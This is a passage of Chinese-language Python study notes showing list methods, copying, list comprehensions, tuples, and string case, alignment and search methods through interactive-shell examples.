<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums = [1, 4, 6, 9, 8, 2, 4, 7]</span><br><span class="line">&gt;&gt;&gt; nums.sort()</span><br><span class="line">&gt;&gt;&gt; nums</span><br><span class="line">[1, 2, 4, 4, 6, 7, 8, 9]</span><br><span class="line">&gt;&gt;&gt; #如果想倒叙怎么做呢？</span><br><span class="line">&gt;&gt;&gt; nums.reverse()          # reverse 是将数组翻转</span><br><span class="line">&gt;&gt;&gt; nums</span><br><span class="line">[9, 8, 7, 6, 4, 4, 2, 1]</span><br></pre></td></tr></table></figure>
<p>sort() 方法还可以实现排序后翻转（即从大到小的排序）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums = [1, 4, 6, 9, 8, 2, 4, 7]</span><br><span class="line">&gt;&gt;&gt; nums.sort(reverse=True)</span><br><span class="line">&gt;&gt;&gt; nums</span><br><span class="line">[9, 8, 7, 6, 4, 4, 2, 1]</span><br></pre></td></tr></table></figure></p>
<ul>
<li>这里可以参考 <code>sort</code> 的用法</li>
</ul>
<h4 id="8-5-4-查（定位列表中的元素）"><a href="#8-5-4-查（定位列表中的元素）" class="headerlink" title="8.5.4 查（定位列表中的元素）"></a>8.5.4 查（定位列表中的元素）</h4><p>如果我们想知道 nums 这个列表里面到底有多少个 4，可以使用 count() 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums</span><br><span class="line">[9, 8, 7, 6, 4, 4, 2, 1]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; nums.count(4)</span><br><span class="line">2</span><br></pre></td></tr></table></figure></p>
<p>如果我们要查找 fruit 列表中，”cherries”这个元素的索引值，可以使用 index() 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; fruit</span><br><span class="line">[&#x27;apple&#x27;, &#x27;apricot&#x27;, &#x27;cherries&#x27;, &#x27;blackberries&#x27;, &#x27;cranberries&#x27;, &#x27;blueberries&#x27;]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; fruit.index(&#x27;cherries&#x27;)</span><br><span class="line">2</span><br></pre></td></tr></table></figure></p>
<p><strong>index()</strong> 还可以直接更换列表中的元素<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; fruit[fruit.index(&#x27;cherries&#x27;)] = &#x27;melon&#x27;</span><br><span class="line">&gt;&gt;&gt; fruit</span><br><span class="line">[&#x27;apple&#x27;, &#x27;apricot&#x27;, &#x27;melon&#x27;, &#x27;blackberries&#x27;, &#x27;cranberries&#x27;, &#x27;blueberries&#x27;]</span><br></pre></td></tr></table></figure><br>相当于 fruit[   4   ] = ‘melon’</p>
<p>index() 方法有两个可选的参数 —— start 和 end，<code>index(x, start, end)</code> 就是指定查找的开始和结束的下标位置：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums = [1, 4, 6, 9, 8, 2, 4, 7]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; nums.index(4, 2, 7)</span><br><span class="line">6</span><br></pre></td></tr></table></figure></p>
<p>列表还有一个方法叫 copy()，用于拷贝一个列表：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums_copy1 = nums.copy()</span><br><span class="line">&gt;&gt;&gt; nums_copy1</span><br><span class="line">[1, 4, 6, 9, 8, 2, 4, 7]</span><br></pre></td></tr></table></figure></p>
<p>我们也可以使用切片的语法来实现列表拷贝：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums_copy2 = nums[:]</span><br><span class="line">&gt;&gt;&gt; nums_copy2</span><br><span class="line">[1, 4, 6, 9, 8, 2, 4, 7]</span><br></pre></td></tr></table></figure></p>
<p>上面这两种拷贝方法实现的效果是等同的。<br>这两种拷贝的方法，在 Python 中都称为浅拷贝。</p>
<h3 id="8-6-列表的加法和乘法"><a href="#8-6-列表的加法和乘法" class="headerlink" title="8.6 列表的加法和乘法"></a>8.6 列表的加法和乘法</h3><p>列表的加法，其实也是拼接，所以要求加号（+）两边都应该是列表，举个例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [4, 5, 6]</span><br><span class="line">&gt;&gt;&gt; t = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; s + t</span><br><span class="line">[4, 5, 6, 1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; matix = [[1, 2, 3],</span><br></pre></td></tr></table></figure></p>
<p>列表的乘法，则是重复列表内部的所有元素若干次：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s * 3</span><br><span class="line">[1, 2, 3, 1, 2, 3, 1, 2, 3]</span><br></pre></td></tr></table></figure></p>
<h3 id="8-7-嵌套列表"><a href="#8-7-嵌套列表" class="headerlink" title="8.7 嵌套列表"></a>8.7 嵌套列表</h3><p>Python 是允许列表进行嵌套的<br><code>&gt;&gt;&gt; matrix = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]</code></p>
<p>可以把创建二维列表的语句这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; matrix = [[1, 2, 3],</span><br><span class="line">              [4, 5, 6],</span><br><span class="line">              [7, 8, 9]]</span><br></pre></td></tr></table></figure><br>这两种写法是等价的，只是后者在理解上更为直观。</p>
<h3 id="8-8-访问嵌套列表"><a href="#8-8-访问嵌套列表" class="headerlink" title="8.8 访问嵌套列表"></a>8.8 访问嵌套列表</h3><p>访问嵌套列表中的元素，可以使用嵌套的 for 语句来实现：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for i in matrix:</span><br><span class="line">...     for each in i:</span><br><span class="line">...         print(each)</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td></tr></table></figure></p>
<p>通过下标同样可以访问嵌套列表：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; matrix[0]</span><br><span class="line">[1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; matrix[1]</span><br><span class="line">[4, 5, 6]</span><br><span class="line">&gt;&gt;&gt; matrix[2]</span><br><span class="line">[7, 8, 9]</span><br><span class="line">&gt;&gt;&gt; matrix[0][0]</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; matrix[1][1]</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; matrix[2][2]</span><br><span class="line">9</span><br></pre></td></tr></table></figure></p>
<h3 id="8-9-通过-for-语句来创建并初始化二维列表"><a href="#8-9-通过-for-语句来创建并初始化二维列表" class="headerlink" title="8.9 通过 for 语句来创建并初始化二维列表"></a>8.9 通过 for 语句来创建并初始化二维列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; A = [0] * 3</span><br><span class="line">&gt;&gt;&gt; for i in range(3):</span><br><span class="line">...     A[i] = [0] * 3</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; A</span><br><span class="line">[[0, 0, 0], [0, 0, 0], [0, 0, 0]]</span><br></pre></td></tr></table></figure>
<h3 id="8-10-浅拷贝和深拷贝"><a href="#8-10-浅拷贝和深拷贝" class="headerlink" title="8.10 浅拷贝和深拷贝"></a>8.10 浅拷贝和深拷贝</h3><p>浅拷贝：利用列表的 copy() 方法或者切片来实现<br>深拷贝：利用 copy 模块的 deepcopy() 函数来实现<br><strong>浅拷贝可以用于处理一维列表，对于嵌套列表的拷贝，只能拷贝第一层数据，其余仅拷贝其引用：</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]</span><br><span class="line">&gt;&gt;&gt; y = x.copy()        # 列表的 copy 方法</span><br><span class="line">&gt;&gt;&gt; x[1][1] = 0</span><br><span class="line">&gt;&gt;&gt; x</span><br><span class="line">[[1, 2, 3], [4, 0, 6], [7, 8, 9]]</span><br><span class="line">&gt;&gt;&gt; y</span><br><span class="line">[[1, 2, 3], [4, 0, 6], [7, 8, 9]]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; import copy</span><br><span class="line">&gt;&gt;&gt; x = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]</span><br><span class="line">&gt;&gt;&gt; y = copy.copy(x)    # copy 模块的copy函数 列表、字符串、元组 都可以拷贝</span><br></pre></td></tr></table></figure><br><img src="/image/浅拷贝.png" alt="浅拷贝"></p>
<p><strong>深拷贝可以用于处理多维列表：</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]</span><br><span class="line">&gt;&gt;&gt; y = copy.deepcopy(x)</span><br><span class="line">&gt;&gt;&gt; x[1][1] = 0</span><br><span class="line">&gt;&gt;&gt; x</span><br><span class="line">[[1, 2, 3], [4, 0, 6], [7, 8, 9]]</span><br><span class="line">&gt;&gt;&gt; y</span><br><span class="line">[[1, 2, 3], [4, 5, 6], [7, 8, 9]]</span><br></pre></td></tr></table></figure><br><img src="/image/深拷贝.jpg" alt="深拷贝"></p>
<h3 id="8-11-列表推导式"><a href="#8-11-列表推导式" class="headerlink" title="8.11 列表推导式"></a>8.11 列表推导式</h3><h4 id="8-11-1-基础语法"><a href="#8-11-1-基础语法" class="headerlink" title="8.11.1 基础语法"></a>8.11.1 基础语法</h4><p>[expression for target in iterable]</p>
<p><strong>example：</strong></p>
<p>掌握好列表推导式，会使代码变得更为简练和高效。<br>比如下面这个循环语句：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; this = [1, 2, 3, 4, 5]</span><br><span class="line">...           </span><br><span class="line">&gt;&gt;&gt; for i in range(len(this)):</span><br><span class="line">...           this[i] = this[i] * 2</span><br></pre></td></tr></table></figure></p>
<p>写成列表推导式就是：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; this = [1, 2, 3, 4, 5]</span><br><span class="line">&gt;&gt;&gt; this = [i * 2 for i in this]</span><br></pre></td></tr></table></figure><br>注意：这可不仅仅是少写了一行代码而已，从程序的执行效率上来说，列表推导式的效率通常是要比循环语句快上一倍左右的速度。 (因为列表推导式是用底层的C语言来执行)</p>
<h4 id="8-11-2-处理矩阵"><a href="#8-11-2-处理矩阵" class="headerlink" title="8.11.2 处理矩阵"></a>8.11.2 处理矩阵</h4><p>利用列表推导式处理矩阵也是非常方便，比如下面代码是将矩阵第 2 列的元素给提取出来：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; matrix = [[1, 2, 3],</span><br><span class="line">...                 [4, 5, 6],</span><br><span class="line">...                 [7, 8, 9]]</span><br><span class="line">&gt;&gt;&gt; col2 = [row[1] for row in matrix]       #选取每行的第二个元素</span><br><span class="line">&gt;&gt;&gt; col2</span><br><span class="line">[2, 5, 8]</span><br></pre></td></tr></table></figure></p>
<p>又比如，下面代码是获取矩阵主对角线上的元素（就是从左上角到右下角这条对角线上的元素）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; diag = [matrix[i][i] for i in range(len(matrix))]   #len()是推导列表里元素的角标</span><br><span class="line">&gt;&gt;&gt; diag</span><br><span class="line">[1, 5, 9]</span><br></pre></td></tr></table></figure></p>
<h4 id="8-11-3-列表推导式创建二维数组"><a href="#8-11-3-列表推导式创建二维数组" class="headerlink" title="8.11.3 列表推导式创建二维数组"></a>8.11.3 列表推导式创建二维数组</h4><p>利用列表推导式，就可以很轻松地创建一个二维列表：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; S = [[0] * 3 for i in range(3)]</span><br><span class="line">&gt;&gt;&gt; S</span><br><span class="line">[[0, 0, 0], [0, 0, 0], [0, 0, 0]]</span><br><span class="line">&gt;&gt;&gt; S[1][1] = 1</span><br><span class="line">&gt;&gt;&gt; S</span><br><span class="line">[[0, 0, 0], [0, 1, 0], [0, 0, 0]]</span><br></pre></td></tr></table></figure></p>
<h4 id="8-11-4-带条件筛选功能的列表推导式"><a href="#8-11-4-带条件筛选功能的列表推导式" class="headerlink" title="8.11.4 带条件筛选功能的列表推导式"></a>8.11.4 带条件筛选功能的列表推导式</h4><p>列表推导式其实还可以添加一个用于筛选的 if 分句，完整语法如下：<br><code>[expression for target in iterable if condition1]</code></p>
<h4 id="8-11-5-多层嵌套的列表推导式"><a href="#8-11-5-多层嵌套的列表推导式" class="headerlink" title="8.11.5 多层嵌套的列表推导式"></a>8.11.5 多层嵌套的列表推导式</h4><p>列表推导式还可以变得更复杂一些，那就是实现嵌套，语法如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[expression for target1 in iterable1</span><br><span class="line">            for target2 in iterable2</span><br><span class="line">            ...</span><br><span class="line">            for targetN in iterableN]</span><br></pre></td></tr></table></figure><br>每层嵌套还可以附带一个用于条件筛选的 if 分句：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[expression for target1 in iterable1 if condition1</span><br><span class="line">            for target2 in iterable2 if condition2</span><br><span class="line">            ...</span><br><span class="line">            for targetN in iterableN if conditionN]</span><br></pre></td></tr></table></figure></p>
<h3 id="9-元组"><a href="#9-元组" class="headerlink" title="9.元组"></a>9.元组</h3><p>元组既能像列表那样同时容纳多种类型的对象，也拥有字符串不可变的特性。</p>
<h3 id="9-1-元组和列表的不同点"><a href="#9-1-元组和列表的不同点" class="headerlink" title="9.1 元组和列表的不同点"></a>9.1 元组和列表的不同点</h3><ul>
<li>列表使用方括号，元祖则是圆括号（也可以不带圆括号）</li>
<li>列表中的元素可以被修改，而元组不行</li>
<li>列表中涉及到修改元素的方法元组均不支持</li>
<li>列表的推导式叫列表推导式，元组的“推导式”叫生成器表达式</li>
</ul>
<h3 id="9-2-元组和列表的共同点"><a href="#9-2-元组和列表的共同点" class="headerlink" title="9.2 元组和列表的共同点"></a>9.2 元组和列表的共同点</h3><ul>
<li>都可以通过下标获取元素</li>
<li>都支持切片操作</li>
<li>都支持 count() 方法和 index() 方法</li>
<li>都支持拼接(+)和重复(*)运算符</li>
<li>都支持嵌套</li>
<li>都支持迭代</li>
</ul>
<h3 id="9-3-圆括号的必要性"><a href="#9-3-圆括号的必要性" class="headerlink" title="9.3 圆括号的必要性"></a>9.3 圆括号的必要性</h3><p><strong>与其纠结什么时候省略圆括号会不会带来问题，还不如一直加上为妙。</strong><br><strong>这样也可以增加代码的可读性</strong></p>
<h3 id="9-4-当元组只有一个元素的时候"><a href="#9-4-当元组只有一个元素的时候" class="headerlink" title="9.4 当元组只有一个元素的时候"></a>9.4 当元组只有一个元素的时候</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = (6,)</span><br><span class="line">&gt;&gt;&gt; type(x)</span><br><span class="line">&lt;class &#x27;tuple&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p><strong>or</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = 789,</span><br><span class="line">&gt;&gt;&gt; x</span><br><span class="line">(789,)</span><br><span class="line">&gt;&gt;&gt; type(x)</span><br><span class="line">&lt;class &#x27;tuple&#x27;&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="9-5-打包和解包"><a href="#9-5-打包和解包" class="headerlink" title="9.5 打包和解包"></a>9.5 打包和解包</h3><p>生成一个元组有时候也称之为元组的打包:<br><code>&gt;&gt;&gt; t = (123, &#39;Mortal&#39;, 2.713)</code><br>将他们一次性赋值给三个变量名的行为，我们称之为解包：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x</span><br><span class="line">123</span><br><span class="line">&gt;&gt;&gt; y</span><br><span class="line">&#x27;Mortal&#x27;</span><br><span class="line">&gt;&gt;&gt; z</span><br><span class="line">2.713</span><br></pre></td></tr></table></figure><br><strong>注意：</strong> 赋值号左侧的变量名数量，必须跟右侧序列的元素数量一致，否则通常都会报错</p>
<h3 id="9-6-多重赋值的真相"><a href="#9-6-多重赋值的真相" class="headerlink" title="9.6 多重赋值的真相"></a>9.6 多重赋值的真相</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x, y = 5, 8</span><br><span class="line">&gt;&gt;&gt; x</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; y</span><br><span class="line">8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>相当于<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; _ = (5, 8)</span><br><span class="line">&gt;&gt;&gt; x, y = _</span><br><span class="line">&gt;&gt;&gt; x</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; y</span><br><span class="line">8</span><br></pre></td></tr></table></figure></p>
<h3 id="9-7-元组的修改"><a href="#9-7-元组的修改" class="headerlink" title="9.7 元组的修改"></a>9.7 元组的修改</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; t = [4, 5, 6]</span><br><span class="line">&gt;&gt;&gt; w = (s, t)</span><br><span class="line">&gt;&gt;&gt; w</span><br><span class="line">([1, 2, 3], [4, 5, 6])</span><br><span class="line">&gt;&gt;&gt; w[0][1] = &#x27;大笨蛋&#x27;</span><br><span class="line">&gt;&gt;&gt; w</span><br><span class="line">([1, &#x27;大笨蛋&#x27;, 3], [4, 5, 6])</span><br></pre></td></tr></table></figure>
<h2 id="10-字符串"><a href="#10-字符串" class="headerlink" title="10. 字符串"></a>10. 字符串</h2><h3 id="10-1-1大小写字母变换"><a href="#10-1-1大小写字母变换" class="headerlink" title="10.1.1大小写字母变换"></a>10.1.1大小写字母变换</h3><p><code>capitalize()</code>   返回将字符串中首字母大写，其余小写的新字符串<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;I love little Cat&quot;</span><br><span class="line">&gt;&gt;&gt; x.capitalize()</span><br><span class="line">&#x27;I love little cat&#x27;</span><br></pre></td></tr></table></figure><br><code>casefold()</code>    返回全部小写的新字符串<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.capitalize()</span><br><span class="line">&#x27;I love little cat&#x27;</span><br></pre></td></tr></table></figure><br><code>title()</code>   返回将字符串中每个单词首字母大写<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.title()</span><br><span class="line">&#x27;I Love Little Cat&#x27;</span><br></pre></td></tr></table></figure><br><code>swapcase()</code>    返回将原字符串大小反转的新字符串<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.swapcase()</span><br><span class="line">&#x27;i LOVE LITTLE cAT&#x27;</span><br></pre></td></tr></table></figure><br><code>upper()</code>   返回全部大写的新字符串<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.upper()</span><br><span class="line">&#x27;I LOVE LITTLE CAT&#x27;</span><br></pre></td></tr></table></figure><br><code>lower()</code>   返回全部小写的新字符串<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.lower()</span><br><span class="line">&#x27;i love little cat&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="10-1-2-左中右对齐"><a href="#10-1-2-左中右对齐" class="headerlink" title="10.1.2  左中右对齐"></a>10.1.2  左中右对齐</h3><p><code>center(width, fillchar=&#39; &#39;)</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.center(15)</span><br><span class="line">&#x27;     小猫爱吃鱼     &#x27;</span><br></pre></td></tr></table></figure><br><code>ljust(width, fillchar=&#39; &#39;)</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.ljust(15)</span><br><span class="line">&#x27;小猫爱吃鱼          &#x27;</span><br></pre></td></tr></table></figure><br><code>rjust(width, fillchar=&#39; &#39;)</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.rjust(15)</span><br><span class="line">&#x27;          小猫爱吃鱼&#x27;</span><br></pre></td></tr></table></figure><br><code>zfill(15)</code>     用<code>0</code>填充左侧<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;520&quot;.zfill(5)</span><br><span class="line">&#x27;00520&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;-520&quot;.zfill(5)</span><br><span class="line">&#x27;-0520&#x27;</span><br><span class="line">&gt;&gt;&gt; x.center(15, &quot;淦&quot;)</span><br><span class="line">&#x27;淦淦淦有内鬼，停止交易！淦淦淦&#x27;</span><br><span class="line">&gt;&gt;&gt; x.ljust(15, &quot;淦&quot;)</span><br><span class="line">&#x27;有内鬼，停止交易！淦淦淦淦淦淦&#x27;</span><br><span class="line">&gt;&gt;&gt; x.rjust(15, &quot;淦&quot;)</span><br><span class="line">&#x27;淦淦淦淦淦淦有内鬼，停止交易！&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="10-2-1-查找"><a href="#10-2-1-查找" class="headerlink" title="10.2.1 查找"></a>10.2.1 查找</h3><p><code>count(sub[,start[,end]])</code>  <code>find(sub[, start[, end]])</code>  <code>rfind(sub[, start[, end]])</code>  <code>index(sub[, start[, end]])</code>  <code>rindex(sub[, start[, end]])</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;上海自来水来自海上&quot;</span><br><span class="line">&gt;&gt;&gt; x.count(&quot;海&quot;)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; x.count(&quot;海&quot;, 0, 5)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; x.find(&quot;海&quot;)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; x.rfind(&quot;海&quot;)</span><br><span class="line">7</span><br><span class="line">&gt;&gt;&gt; x.find(&quot;龟&quot;)</span><br><span class="line">-1</span><br><span class="line">&gt;&gt;&gt; x.index(&quot;龟&quot;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#6&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    x.index(&quot;龟&quot;)</span><br><span class="line">ValueError: substring not found</span><br></pre></td></tr></table></figure>
<h3 id="10-2-2-替换"><a href="#10-2-2-替换" class="headerlink" title="10.2.2 替换"></a>10.2.2 替换</h3><p><code>expandtabs([tabsize=8])</code>  <code>replace(old, new, count=-1)</code>  <code>translate(table)</code></p>
<p>首先是 <code>expandtabs([tabsize=8])</code> 方法，它的作用是使用空格替换制表符并返回新的字符串。</p>
<p>比如你现在在路边捡到一段代码，里面混了着 Tab 和空格：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; code = &quot;&quot;&quot;</span><br><span class="line">        print(&quot;I love MoralSec.&quot;)</span><br><span class="line">    print(&quot;I love my wife.&quot;)&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></p>
<p>那么使用 <code>expandtabs(tabsize=4)</code> 方法，就可以将字符串中的 Tab 转换成空格，其中 tabsize 参数指定的是一个 Tab 使用多少个空格来代替：</p>
